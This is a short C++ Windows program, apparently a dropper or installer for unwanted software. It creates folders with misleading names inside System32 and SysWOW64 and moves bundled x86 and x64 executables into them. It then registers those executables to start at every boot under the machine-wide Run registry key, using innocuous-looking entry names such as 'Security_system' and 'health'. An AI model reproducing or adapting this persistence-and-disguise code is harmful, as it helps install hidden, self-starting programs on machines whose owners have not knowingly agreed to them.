/*更改註冊表項及將執行檔移至事先在系統碟創建的資料夾裡*/ 
//

#include "stdafx.h"
#include <iostream>
#include <Windows.h>
#include <string.h>
#include <io.h>
#include <string>
#pragma warning( disable : 4996 )
using namespace std;
void listFiles(const char* dir,char *p);

int _tmain(int argc, _TCHAR* argv[])
{
	HKEY key;
    LPCTSTR data = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
    long a,b,c;
    
    if ((a = RegOpenKeyEx(HKEY_LOCAL_MACHINE, data, 0, KEY_WRITE, &key)) == ERROR_SUCCESS)
    {
        char path[200] = "C:\\Windows\\SysWOW64\\networktlist\\command_background.exe";
		char path1[200]="C:\\Windows\\System32\\networktlist32\\command_background.exe";
        if ((b = RegSetValueEx(key, "Security_system", 0, REG_SZ, (BYTE*)path, strlen(path))) == ERROR_SUCCESS) {
            //printf("%d\n", b);
        }
		if ((c = RegSetValueEx(key, "health", 0, REG_SZ, (BYTE*)path1, strlen(path1))) == ERROR_SUCCESS) {
            //printf("%d\n", c);
        }
    }
    ::RegCloseKey(key);

    char path1[100] = "C:\\Windows\\SysWOW64\\networktlist";
    CreateDirectoryA(path1, NULL);
	char path2[100] = "C:\\Windows\\System32\\networktlist32";
	CreateDirectoryA(path2, NULL);

    char current[1000] = "";
	char current1[1000] = "";
    GetCurrentDirectoryA(1000, current);
	GetCurrentDirectoryA(1000, current1);
	strcat(current,"\\x86");
    listFiles(current,path1);
	strcat(current1,"\\x64");
	listFiles(current1,path2);
    system("pause");
	return 0;
}
void listFiles(const char* dir,char *p)
{
    char dirNew[200];
    strcpy(dirNew, dir);
    strcat(dirNew, "\\*.*");     // 在目錄後面加上"\\*.*"進行第一次搜索

    intptr_t handle;
    _finddata_t findData;

    handle = _findfirst(dirNew, &findData);
    if (handle == -1)         // 檢查是否成功
        return;

    do
    {
        if (findData.attrib & _A_SUBDIR)
        {
            if (strcmp(findData.name, ".") == 0 || strcmp(findData.name, "..") == 0)
                continue;

            //cout << findData.name << "\t<dir>\n";

            // 在目錄後面加上"\\"和搜索到的目錄名進行下一次搜索
            strcpy(dirNew, dir);
            strcat(dirNew, "\\");
            strcat(dirNew, findData.name);

            listFiles(dirNew,p);
        }
        else {
            string s(p),s1(dir);
            s.append("\\");
            s.append(findData.name);
            s1.append("\\");
            s1.append(findData.name);
            MoveFileA(s1.c_str(), s.c_str());
            //printf("%s\n", findData.name);
        }
    } while (_findnext(handle, &findData) == 0);

    _findclose(handle);    // 關閉搜索句柄
}

